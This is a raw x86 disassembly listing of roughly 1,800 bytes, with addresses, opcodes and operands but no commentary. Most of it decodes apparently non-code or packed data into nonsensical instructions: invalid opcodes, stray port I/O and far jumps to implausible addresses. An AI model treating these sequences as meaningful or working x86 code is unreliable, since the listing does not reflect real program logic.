  42fbe8:	shr    BYTE PTR [ecx+0x70fa187b],0x35
  42fbef:	dec    esi
  42fbf0:	dec    ebx
  42fbf1:	jo     0x42fb99
  42fbf3:	pop    ecx
  42fbf4:	test   eax,0x2343260b
  42fbf9:	pop    eax
  42fbfa:	push   eax
  42fbfb:	dec    edx
  42fbfc:	(bad)  
  42fbfd:	fsubrp st(0),st
  42fbff:	out    0x94,al
  42fc01:	js     0x42fbe4
  42fc03:	push   edx
  42fc04:	sbb    DWORD PTR [edi-0x38],eax
  42fc07:	int    0x38
  42fc09:	test   al,0xe3
  42fc0b:	stc    
  42fc0c:	fwait
  42fc0d:	les    ebp,FWORD PTR [esi+0x78]
  42fc10:	mov    ds:0x0,al
	...
  42fc71:	add    BYTE PTR [eax],al
  42fc73:	add    BYTE PTR [ebx],cl
  42fc75:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc7b:	call   0x467d:0x2036325e
  42fc82:	dec    esi
  42fc83:	sub    DWORD PTR [ecx+0x5000200],0x36000001
  42fc8d:	loop   0x42fcad
  42fc8f:	dec    esi
  42fc90:	or     DWORD PTR [esp+edi*8+0x57],edi
  42fc94:	ror    BYTE PTR [edi+eax*2+0x2fb14058],cl
  42fc9b:	mov    ah,0x2d
  42fc9d:	xor    ah,BYTE PTR [edx-0x5b]
  42fca0:	mov    esp,0x6a9bf916
  42fca5:	xchg   ecx,eax
  42fca6:	xchg   bh,cl
  42fca8:	jecxz  0x42fcf8
  42fcaa:	daa    
  42fcab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fcac:	daa    
  42fcad:	repnz pop es
  42fcaf:	dec    ebp
  42fcb0:	inc    edi
  42fcb1:	mov    al,0x3b
  42fcb3:	les    esi,FWORD PTR [ebx-0x3d3a7e5f]
  42fcb9:	retf   0x9c38
  42fcbc:	in     al,0xf0
  42fcbe:	xchg   ebx,eax
  42fcbf:	mov    ecx,0xa77a64b1
  42fcc4:	inc    edx
  42fcc5:	lods   eax,DWORD PTR ds:[esi]
  42fcc6:	sbb    al,0x93
  42fcc8:	inc    eax
  42fcc9:	aas    
  42fcca:	fs out 0x70,eax
  42fccd:	dec    esp
  42fcce:	adc    eax,0x4b4859bf
  42fcd3:	icebp  
  42fcd4:	cmp    edx,DWORD PTR [ecx+0x734ec8]
  42fcda:	xchg   esi,eax
  42fcdb:	and    DWORD PTR [ebp-0x4],0xffffff94
  42fcdf:	lods   al,BYTE PTR ds:[esi]
  42fce0:	cmp    al,0xef
  42fce2:	push   esi
  42fce3:	xchg   esi,eax
  42fce4:	add    al,0x1a
  42fce6:	sub    eax,DWORD PTR [ebx-0x4ca77c68]
  42fcec:	lds    esp,FWORD PTR [esi+0x26]
  42fcef:	sub    ah,BYTE PTR [edx-0x24]
  42fcf2:	in     al,0xda
  42fcf4:	pop    ecx
  42fcf5:	mov    ds,WORD PTR [edx-0x525f465a]
  42fcfb:	iret   
  42fcfc:	jbe    0x42fd24
  42fcfe:	shl    BYTE PTR [edi+ebp*1-0x34b094fe],cl
  42fd05:	mov    ch,0xc8
  42fd07:	mov    ah,0xd8
  42fd09:	data16 jge 0x42fcb7
  42fd0c:	mov    ah,0x88
  42fd0e:	mov    dh,0xa3
  42fd10:	rol    BYTE PTR [ecx],cl
  42fd12:	push   cs
  42fd13:	in     al,dx
  42fd14:	xor    BYTE PTR [eax+0x7c],bh
  42fd17:	inc    eax
  42fd18:	stc    
  42fd19:	in     eax,dx
  42fd1a:	inc    ecx
  42fd1b:	rcr    DWORD PTR [edi-0xf99246a],0x3f
  42fd22:	sub    bl,BYTE PTR [ecx+0x49]
  42fd25:	sub    al,0x54
  42fd27:	dec    edi
  42fd28:	sbb    bl,BYTE PTR [esp+esi*4-0x24]
  42fd2c:	cmp    eax,ecx
  42fd2e:	das    
  42fd2f:	mov    ebx,0xf5f049cf
  42fd34:	fs daa 
  42fd36:	xor    eax,0xdab49441
  42fd3b:	mov    dh,0xab
  42fd3d:	fwait
  42fd3e:	mov    eax,0xdedeae69
  42fd43:	adc    ebp,0x10
  42fd46:	scas   eax,DWORD PTR es:[edi]
  42fd47:	pop    esi
  42fd48:	xor    edi,DWORD PTR [edi+0x4622307]
  42fd4e:	ror    DWORD PTR [ebx],cl
  42fd50:	jbe    0x42fd7e
  42fd52:	inc    edx
  42fd53:	out    dx,al
  42fd54:	add    eax,0x7d3482db
  42fd59:	mov    bh,0x0
  42fd5b:	int3   
  42fd5c:	push   0x63
  42fd5e:	jnp    0x42fd8b
  42fd60:	or     eax,0xdd7c27fa
  42fd65:	xor    dh,BYTE PTR [ecx]
  42fd67:	add    BYTE PTR [esi],ch
  42fd69:	mov    ebx,0xfbaa588f
  42fd6e:	js     0x42fd4c
  42fd70:	push   0x9fd6181e
  42fd75:	mov    DWORD PTR [esi+edx*8],esp
  42fd78:	call   0xededcf90
  42fd7d:	outs   dx,DWORD PTR ds:[esi]
  42fd7e:	bound  eax,QWORD PTR [ecx+0x25ef32b4]
  42fd84:	jmp    0x5383d7a5
  42fd89:	mov    ch,0xcb
  42fd8b:	mov    ebp,0x44fc0cad
  42fd90:	mov    ch,0x0
	...
  42fdf2:	add    BYTE PTR [eax],al
  42fdf4:	dec    eax
  42fdf5:	rol    dl,0xf0
  42fdf8:	retf   0x7af2
  42fdfb:	clc    
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz enter 0xbfda,0x3a
  42fe04:	scas   al,BYTE PTR es:[edi]
  42fe05:	add    DWORD PTR [edx],eax
  42fe07:	add    BYTE PTR ds:0x6e000001,al
  42fe0d:	fnstsw WORD PTR [eax]
  42fe0f:	push   es
  42fe10:	push   esi
  42fe11:	test   BYTE PTR [eax-0x36cb312],dl
  42fe17:	inc    esi
  42fe18:	ret    0x539f
  42fe1b:	ror    bh,0x18
  42fe1e:	cld    
  42fe1f:	mov    al,0xfe
  42fe21:	imul   edx,DWORD PTR [ebp-0x7be0d5a3],0x9b9c59b
  42fe2b:	push   0x66
  42fe2d:	push   eax
  42fe2e:	cmp    DWORD PTR [ebp+ebx*4-0x44080759],esi
  42fe35:	aad    0xc2
  42fe37:	jmp    0x42fdf3
  42fe39:	jge    0x42fdc5
  42fe3b:	mov    esp,0x465dcccc
  42fe40:	aad    0xfe
  42fe42:	pop    ss
  42fe43:	mov    al,ds:0x80a792f1
  42fe48:	xchg   edi,eax
  42fe49:	inc    ebx
  42fe4a:	fs mov ecx,ebx
  42fe4d:	dec    esp
  42fe4e:	push   ecx
  42fe4f:	call   0xb99a:0xf625b5df
  42fe56:	mov    cl,0x8c
  42fe58:	xchg   ebp,eax
  42fe59:	pop    ecx
  42fe5a:	dec    ebp
  42fe5b:	inc    edx
  42fe5c:	(bad)  
  42fe5d:	shr    BYTE PTR [ebx],0x67
  42fe60:	int3   
  42fe61:	test   BYTE PTR [ebx-0x13],al
  42fe64:	test   al,0x29
  42fe66:	xor    BYTE PTR [esi-0x6d],ch
  42fe69:	rol    DWORD PTR [edx],cl
  42fe6b:	sub    ah,BYTE PTR [esi]
  42fe6d:	retf   
  42fe6e:	pop    ecx
  42fe6f:	clc    
  42fe70:	out    0xc2,eax
  42fe72:	repz add BYTE PTR [esi-0x56242816],0x88
  42fe7a:	pop    ebx
  42fe7b:	xchg   esi,eax
  42fe7c:	arpl   WORD PTR ds:0xd14dbd06,cx
  42fe82:	and    ch,BYTE PTR [edi+eiz*2]
  42fe85:	jb     0x42fe42
  42fe87:	outs   dx,BYTE PTR ds:[esi]
  42fe88:	mov    al,ds:0x50c08dba
  42fe8d:	scas   al,BYTE PTR es:[edi]
  42fe8e:	cli    
  42fe8f:	loope  0x42feb6
  42fe91:	mov    esp,0xb53bf46f
  42fe96:	stos   DWORD PTR es:[edi],eax
  42fe97:	not    DWORD PTR [ecx-0x38b0a9f6]
  42fe9d:	sahf   
  42fe9e:	sbb    esi,DWORD PTR [edi]
  42fea0:	or     al,0xe
  42fea2:	dec    ebx
  42fea3:	fnstenv [eax+0x78d53310]
  42fea9:	test   eax,0xcae4bdf0
  42feae:	xchg   ecx,eax
  42feaf:	lahf   
  42feb0:	stos   BYTE PTR es:[edi],al
  42feb1:	mov    ebx,0x7774f7c9
  42feb6:	je     0x42fe3b
  42feb8:	rcl    BYTE PTR [eax+0x701a07e9],0x3f
  42febf:	retf   
  42fec0:	(bad)
  42fec3:	leave  
  42fec4:	js     0x42fe73
  42fec6:	fstp   QWORD PTR [eax-0x71]
  42fec9:	sub    esi,esi
  42fecb:	xor    ecx,0xffffff84
  42fece:	sbb    eax,0xeeeae5dd
  42fed3:	mov    dh,0x5c
  42fed5:	jle    0x42ff4f
  42fed7:	and    edi,esi
  42fed9:	fmul   DWORD PTR [esi+edx*1]
  42fedc:	pop    es
  42fedd:	test   BYTE PTR [esi],cl
  42fedf:	popf   
  42fee0:	iret   
  42fee1:	jmp    0x7ce21419
  42fee6:	jecxz  0x42ff39
  42fee8:	sub    eax,0x323389dd
  42feed:	mov    eax,ds:0x70672c2d
  42fef2:	add    al,0x3b
  42fef4:	fwait
  42fef5:	les    edx,FWORD PTR [ebx-0x4948b5eb]
  42fefb:	pop    es
  42fefc:	out    0xe1,al
  42fefe:	(bad)  
  42feff:	lea    ebx,[ebp-0x27]
  42ff02:	adc    BYTE PTR [ecx-0x47077861],bh
  42ff08:	xchg   esp,eax
  42ff09:	or     ebp,DWORD PTR [ebp-0xd4b3a07]
  42ff0f:	fisttp QWORD PTR [esi+0x0]
	...
  42ff72:	add    BYTE PTR [eax],al
  42ff74:	add    al,0x67
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [esp+edx*4+0x48],0x86
  42ff83:	out    dx,al
  42ff84:	mov    bl,0x2
  42ff86:	add    al,BYTE PTR [eax]
  42ff88:	xchg   esi,eax
  42ff89:	add    BYTE PTR [eax],al
  42ff8b:	add    BYTE PTR [edi],bl
  42ff8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ff8e:	out    dx,al
  42ff8f:	jo     0x42ff27
  42ff91:	imul   ecx,DWORD PTR gs:[esi],0xffffff88
  42ff95:	(bad)  
  42ff96:	or     esi,DWORD PTR [ebp+0x10]
  42ff99:	clc    
  42ff9a:	xlat   BYTE PTR ds:[ebx]
  42ff9b:	lods   al,BYTE PTR ds:[esi]
  42ff9c:	lods   al,BYTE PTR ds:[esi]
  42ff9d:	rol    BYTE PTR [ecx],1
  42ff9f:	and    ah,dh
  42ffa1:	mov    ch,0x78
  42ffa3:	xchg   esi,eax
  42ffa4:	lods   al,BYTE PTR ds:[esi]
  42ffa5:	in     eax,dx
  42ffa6:	sar    ch,cl
  42ffa8:	mov    esp,0x53b577a
  42ffad:	mov    esp,0xddbab212
  42ffb2:	(bad)  
  42ffb4:	int3   
  42ffb5:	jmp    0x42ff4b
  42ffb7:	ins    DWORD PTR es:[edi],dx
  42ffb8:	push   ecx
  42ffb9:	mov    esp,0x224e69be
  42ffbe:	pop    ds
  42ffbf:	mov    cl,0x62
  42ffc1:	cmp    ebx,DWORD PTR [edi+0x67]
  42ffc4:	ror    ebp,1
  42ffc6:	xor    eax,ecx
  42ffc8:	mov    ds:0x162db17c,al
  42ffcd:	das    
  42ffce:	xor    bh,BYTE PTR [ecx-0x4a0b3881]
  42ffd4:	loope  0x430002
  42ffd6:	repz dec edx
  42ffd8:	out    0xf9,eax
  42ffda:	outs   dx,BYTE PTR ds:[esi]
  42ffdb:	jbe    0x430012
  42ffdd:	sub    ecx,DWORD PTR [ebx+0x29]
  42ffe0:	pop    edx
  42ffe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ffe2:	test   eax,0x81a652cc
  42ffe7:	and    edx,DWORD PTR [ebp+0x52]
  42ffea:	enter  0x20d9,0x23
  42ffee:	xchg   esp,eax
  42ffef:	adc    al,0x2d
  42fff1:	sbb    BYTE PTR [ebx+0x3f],ch
  42fff4:	out    0xc7,eax
  42fff6:	or     DWORD PTR [eax],esp
  42fff8:	pusha  
  42fff9:	outs   dx,BYTE PTR ds:[esi]
  42fffa:	xchg   ebp,eax
  42fffb:	or     DWORD PTR [ecx+0x63],esi
  42fffe:	into   
  42ffff:	call   0x8270:0x688954b3
  430006:	dec    esi
  430007:	rol    DWORD PTR [esi+edx*2+0x3e],1
  43000b:	pushf  
  43000c:	and    eax,0x32fb144
  430011:	xor    edi,DWORD PTR [ebp+ebp*4+0x61bc0fb7]
  430018:	in     al,0x1e
  43001a:	nop
  43001b:	(bad)  
  43001d:	sub    bh,bl
  43001f:	(bad)  
  430020:	(bad)  
  430021:	pop    ebx
	...
  430072:	add    BYTE PTR [eax],al
  430074:	dec    ebp
  430075:	push   ebp
  430076:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43007c:	mov    esp,ebp
  43007e:	or     ah,dh
  430080:	dec    ebp
  430081:	add    bh,al
  430083:	add    BYTE PTR [eax],cl
  430085:	add    BYTE PTR [eax],al
  430087:	mov    DWORD PTR [eax],0x40f44545
  43008d:	xor    DWORD PTR [eax],eax
  43008f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430095:	(bad)  
  430096:	enter  0x4d45,0xbc
  43009a:	mov    esi,DWORD PTR [edx]
  43009c:	hlt    
  43009d:	test   ebx,ecx
  43009f:	pushf  
  4300a0:	enter  0x4df8,0x8b
  4300a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4300ab:	inc    ebp
  4300ac:	mov    ebp,0xff8bfffc
  4300b1:	dec    ebp
  4300b2:	mov    ch,0xf4
  4300b4:	call   DWORD PTR [ebx-0x1]
  4300b7:	mov    ebx,0x8005474
  4300bc:	call   DWORD PTR [ecx+0x8]
  4300bf:	pop    es
  4300c0:	jmp    0xb8:0xacb4533
  4300c7:	fwait
  4300c8:	mov    esi,DWORD PTR [edx-0xc]
  4300cb:	xor    cl,bl
  4300cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4300d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4300d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4300df:	xor    eax,DWORD PTR [eax]
  4300e1:	retf   
  4300e2:	retf   
  4300e3:	add    ecx,eax
  4300e5:	enter  0x894d,0x64
  4300e9:	dec    ebp
  4300ea:	sbb    ah,cl
  4300ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4300f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4300f8:	test   DWORD PTR [ebx],esi
  4300fa:	dec    ebx
  4300fc:	inc    DWORD PTR [ebx]
  4300fe:	inc    eax
  4300ff:	enter  0x8989,0x50
  430103:	(bad)  
  430104:	call   DWORD PTR [ebx+ecx*4-0x1]
  430108:	cld    
  430109:	dec    DWORD PTR [ebp-0xa90001]
  43010f:	push   edi
  430110:	mov    BYTE PTR [edx+0x1],ch
  430113:	and    al,BYTE PTR [eax]
  430115:	pop    ecx
  430116:	inc    ebp
  430117:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43011d:	push   0xffffff89
  43011f:	pop    ecx
  430120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430121:	dec    ebp
  430122:	add    BYTE PTR [ecx+0x45fc088b],cl
  430128:	jne    0x430174
  43012a:	lea    eax,[eax]
  43012c:	push   eax
  43012d:	(bad)  
  43012e:	dec    DWORD PTR [eax]
  430130:	mov    DWORD PTR [eax],eax
  430132:	test   al,0x0
  430134:	add    BYTE PTR [ebp-0x18],cl
  430137:	xor    ebp,DWORD PTR [ebx]
  430139:	add    eax,DWORD PTR [eax]
  43013b:	mov    eax,eax
  43013d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430144:	inc    ebp
  430145:	mov    DWORD PTR [ebx+0x459408],ecx
  43014b:	arpl   WORD PTR [ebx-0x372749b],cx
  430151:	sub    al,0x80
  430153:	inc    DWORD PTR [ecx]
  430155:	lea    eax,[eax]
  430157:	or     al,0x0
  430159:	inc    DWORD PTR [ecx-0x18]
  43015c:	mov    ecx,DWORD PTR [ebx]
  43015e:	cld    
  43015f:	add    BYTE PTR [ecx+0x75014d],cl
  430165:	(bad)  
  430166:	xchg   ebp,eax
  430167:	fdivr  st,st(7)
  430169:	inc    eax
  43016a:	inc    DWORD PTR [eax]
  43016c:	mov    ecx,DWORD PTR [ebp-0x4]
  43016f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430175:	add    BYTE PTR [edx],dl
  430177:	enter  0x4d90,0x0
  43017b:	mov    eax,DWORD PTR [eax]
  43017d:	hlt    
  43017e:	add    al,0xa5
  430180:	mov    al,0xff
  430182:	add    bh,bh
  430184:	add    BYTE PTR [ebx],dh
  430186:	inc    DWORD PTR [ebx]
  430188:	sbb    al,0x89
  43018a:	jne    0x430168
  43018c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430192:	mov    eax,DWORD PTR [ebp-0xff0048]
  430198:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43019f:	inc    DWORD PTR [ebp-0x75]
  4301a2:	fisttp QWORD PTR [esi+ebp*8]
  4301a5:	test   DWORD PTR [esi-0x1],esp
  4301a8:	inc    ebp
  4301a9:	(bad)  
  4301aa:	aas    
  4301ab:	inc    ebp
  4301ac:	(bad)  
  4301ad:	lea    edi,[esp+eiz*2-0x1]
  4301b1:	inc    edi
  4301b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4301b9:	mov    ebp,esp
  4301bb:	cld    
  4301bc:	loop   0x43014b
  4301be:	inc    ebp
  4301bf:	(bad)  
  4301c0:	out    dx,al
  4301c1:	(bad)  
  4301c2:	fisttp WORD PTR [eax+0x8801c7]
  4301c8:	jecxz  0x43020f
  4301ca:	in     al,dx
  4301cb:	inc    DWORD PTR [ebp-0x4]
  4301ce:	out    0x8d,eax
  4301d0:	aas    
  4301d1:	inc    edi
  4301d3:	jmp    FWORD PTR [eax-0x78]
  4301d6:	inc    DWORD PTR [ecx]
  4301d8:	mov    DWORD PTR [eax],0xc7043d
  4301de:	ins    BYTE PTR es:[edi],dx
  4301df:	test   edi,edi
  4301e1:	pandn  mm0,mm5
  4301e4:	aas    
  4301e5:	add    bh,al
  4301e7:	mov    esi,DWORD PTR [eax-0x4]
  4301ea:	inc    DWORD PTR [eax+0xdf01ee]
  4301f0:	(bad)  
  4301f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4301f5:	mov    ebp,ebx
  4301f7:	xchg   esp,eax
  4301f8:	fild   DWORD PTR [eax]
  4301fa:	(bad)  
  4301fb:	mov    edi,DWORD PTR [eax+0x3]
  4301fe:	(bad)  
  4301ff:	cmp    al,0xe7
  430201:	dec    ebp
  430202:	leave  
  430203:	mov    ebp,eax
  430205:	fsubr  DWORD PTR [edx]
  430207:	add    BYTE PTR [eax],al
  430209:	lea    ecx,[ebx-0x7f0003b4]
  43020f:	push   edx
  430210:	add    DWORD PTR [ebp+0x0],edx
  430213:	mov    esi,DWORD PTR [eax]
  430215:	mov    WORD PTR [edi],ss
  430217:	add    BYTE PTR [eax],al
  430219:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43021f:	add    ah,bh
  430221:	push   0x7d
  430223:	dec    DWORD PTR [ebx+0xd88c]
  430229:	push   edx
  43022a:	mov    edx,DWORD PTR [ecx-0x4]
  43022d:	call   DWORD PTR [eax+0x7d01fc]
  430233:	mov    esi,DWORD PTR [esi]
  430235:	cld    
  430236:	add    BYTE PTR [eax+0x560150],dl
  43023c:	test   DWORD PTR [ebp+0x75],eax
  43023f:	loop   0x4301cc
  430241:	jmp    0xe38b:0x947dc7fc
  430248:	fsub   st,st(7)
  43024a:	add    bh,al
  43024c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430252:	add    edi,edi
  430254:	add    bh,bh
  430256:	adc    al,0xed
  430258:	add    dh,ah
  43025a:	push   eax
  43025b:	inc    ebp
  43025c:	push   esi
  43025d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430263:	test   BYTE PTR [ebx],dh
  430265:	out    0x5,al
  430267:	shl    BYTE PTR [edx+0x45],0x0
  43026b:	jmp    0x43022e
  43026d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430274:	inc    esi
  430275:	jle    0x430277
  430277:	test   edi,eax
  430279:	(bad)  
  43027a:	call   0x130037e
  43027f:	out    0x75,al
  430281:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430287:	in     al,dx
  430288:	mov    esp,edx
  43028a:	mov    ah,0x85
  43028c:	add    bh,bh
  43028e:	call   0x1292c92
  430293:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43029a:	add    ebx,esp
  43029c:	add    ah,ch
  43029e:	xor    BYTE PTR [ebp-0xff0073],al
  4302a4:	mov    ebx,ebp
  4302a6:	cld    
  4302a7:	jle    0x430232
  4302a9:	add    DWORD PTR gs:[eax],eax
  4302ac:	add    BYTE PTR [eax+0x1],dl
  4302af:	inc    ebp
  4302b0:	inc    ebp
  4302b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4302b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4302bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4302c3:	inc    ebp
  4302c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4302ca:	inc    ebp
  4302cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4302d1:	mov    edi,edi
  4302d3:	mov    eax,0xe80800ff
  4302d8:	inc    ebp
  4302d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4302df:	add    al,0x1
  4302e1:	rol    BYTE PTR [eax],0x1e
  4302e4:	jne    0x43032b
  4302e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4302ec:	inc    DWORD PTR [ecx]
  4302ee:	call   0x882bf3
  4302f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4302f9:	call   0x432cff
  4302fe:	xor    bh,bh
  430300:	push   edi
  430301:	adc    BYTE PTR [ebx-0x74741bbb],al
  430307:	fsub   st,st(4)
  430309:	ret    
  43030a:	loopne 0x4302a7
  43030c:	xor    DWORD PTR [edx],0x31
  43030f:	cmp    edi,edi
  430311:	bswap  eax
  430313:	rol    BYTE PTR gs:[eax],0x5
  430317:	jmp    0x12e0461
  43031c:	mov    eax,DWORD PTR [ebp-0x4]
  43031f:	add    BYTE PTR [eax+0xff0100],bh
  430325:	cld    
  430326:	jne    0x4303a5
  430328:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43032e:	jb     0x430331
  430330:	add    BYTE PTR [eax],al
  430332:	push   eax
  430333:	fild   DWORD PTR [ebp+0x0]
  430336:	mov    edx,DWORD PTR [eax-0x68]
  430339:	inc    ebp
  43033a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430340:	or     bh,bh
  430342:	inc    ebp
  430343:	call   0x1272a47
  430348:	jge    0x430397
  43034a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430350:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430356:	fwait
  430357:	mov    eax,0x30132
  43035c:	lea    esi,[ebp+0x2c]
  43035f:	xor    edi,edi
  430361:	(bad)  
  430362:	call   0x1422ccf
  430367:	call   0x1372cf7
  43036c:	jne    0x4302f9
  43036e:	xor    edi,esp
  430370:	add    eax,DWORD PTR [eax+0xc018d]
  430376:	push   DWORD PTR [eax]
  430378:	call   0xcc2cd4
  43037d:	enter  0x45ff,0xe0
  430381:	mov    ecx,DWORD PTR [ebp-0x28]
  430384:	xor    eax,DWORD PTR [eax]
  430386:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43038c:	(bad)  
  43038d:	xchg   ebp,eax
  43038e:	call   0x1420492
  430393:	mov    cl,0x45
  430395:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43039b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4303a2:	mov    edi,edi
  4303a4:	or     BYTE PTR [eax],cl
  4303a6:	inc    ebp
  4303a7:	test   DWORD PTR gs:[eax],eax
  4303aa:	je     0x4303f1
  4303ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4303b2:	xor    edx,DWORD PTR [eax-0x73]
  4303b5:	push   ebp
  4303b6:	or     BYTE PTR [ebp+0x21007572],al
  4303bc:	inc    ebp
  4303bd:	loopne 0x43034a
  4303bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4303c6:	int    0x0
  4303c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4303ce:	inc    ebp
  4303cf:	push   ebp
  4303d0:	cmp    ebp,eax
  4303d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4303d9:	cld    
  4303da:	fadd   QWORD PTR [eax+0x3b014d]
  4303e0:	jne    0x430412
  4303e2:	push   0xf8898557
  4303e7:	loopne 0x43045e
  4303e9:	inc    ebp
  4303ea:	lea    eax,[ebx+0x72e8e4cc]
  4303f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4303f6:	jmp    0x43042b
  4303f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4303fe:	xor    eax,edi
  430400:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43040a:	rcl    BYTE PTR [eax-0x40],1
  43040d:	inc    ebp
  43040e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430416:	inc    ebp
  430417:	xchg   ebp,eax
  430418:	ud0    ebp,DWORD PTR [ebx]
  43041b:	inc    DWORD PTR [eax]
  43041d:	daa    
  43041e:	jbe    0x430420
  430420:	mov    dl,BYTE PTR [eax-0x80]
  430423:	push   ebp
  430424:	pop    ds
  430425:	mov    ecx,DWORD PTR [esp+esi*8]
  430428:	inc    eax
  430429:	retf   
  43042a:	inc    ebp
  43042b:	iret   
  43042c:	jb     0x4303f6
  43042e:	mov    eax,DWORD PTR [edi]
  430430:	int3   
  430431:	inc    ebp
  430432:	inc    ebp
  430433:	add    DWORD PTR [ecx],esi
  430435:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43043c:	xor    dh,BYTE PTR [ebx]
  43043e:	pushf  
  43043f:	lea    ecx,[ecx+0x4d72d808]
  430445:	add    BYTE PTR [ebx],dh
  430447:	inc    ebp
  430448:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43044e:	xor    dl,BYTE PTR [edx]
  430450:	add    eax,DWORD PTR [ebp-0x77]
  430453:	mov    eax,esp
  430455:	fmul   QWORD PTR [ebp-0x3d]
  430458:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43045f:	mov    DWORD PTR [ebp-0x24],eax
  430462:	rol    DWORD PTR [ebp-0x64],1
  430465:	xor    eax,edi
  430467:	mov    ecx,0xff858db0
  43046c:	clc    
  43046d:	enter  0x4d45,0x3c
  430471:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430478:	test   esi,edi
  43047a:	clc    
  43047b:	inc    DWORD PTR [ebp+0x45]
  43047e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430486:	test   DWORD PTR [ecx],esi
  430488:	clc    
  430489:	pushf  
  43048a:	inc    ebp
  43048b:	(bad)  
  43048c:	cmp    ah,bh
  43048e:	pushf  
  43048f:	inc    ebp
  430490:	mov    edx,DWORD PTR [eax-0x24]
  430493:	add    BYTE PTR [ebp+0x0],dl
  430496:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43049c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4304a0:	add    al,dl
  4304a2:	jmp    0x1040672
  4304a7:	jb     0x4304f6
  4304a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4304af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4304b2:	xor    ecx,DWORD PTR [edi]
  4304b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4304b8:	(bad)  
  4304ba:	clc    
  4304bb:	int3   
  4304bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4304c3:	push   cs
  4304c4:	xor    ecx,eax
  4304c6:	xor    esp,ecx
  4304c8:	add    ebp,DWORD PTR [eax]
  4304ca:	add    esi,DWORD PTR [eax]
  4304cc:	(bad)  
  4304ce:	retf   0x55cc
  4304d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4304d5:	(bad)  
  4304d6:	cli    
  4304d7:	fdiv   st(1),st
  4304d9:	test   DWORD PTR [eax+edi*8],ecx
  4304dc:	dec    ebp
  4304dd:	inc    ebp
  4304de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4304e4:	add    BYTE PTR [ebp+0x0],al
  4304e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4304ea:	mov    ecx,ebx
  4304ec:	clc    
  4304ed:	jne    0x4304ba
  4304ef:	mov    esi,0xd672d3
  4304f4:	into   
  4304f5:	into   
  4304f6:	scas   eax,DWORD PTR es:[edi]
  4304f7:	dec    ebp
  4304f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4304fe:	sub    ecx,esi
  430500:	cmp    ecx,DWORD PTR [ebp+0x77]
  430503:	(bad)  
  430504:	mov    edi,eax
  430506:	mov    al,0x85
  430508:	mov    eax,edi
  43050a:	add    BYTE PTR [ebp-0x75],al
  43050d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430514:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43051a:	(bad)  
  43051c:	retf   0x559c
  43051f:	(bad)  
  430520:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430527:	inc    ebp
  430528:	add    eax,0xeb9c4d3f
  43052d:	(bad)  
  43052e:	mov    ecx,eax
  430530:	lods   al,BYTE PTR ds:[esi]
  430531:	test   DWORD PTR [ebp-0x8],edx
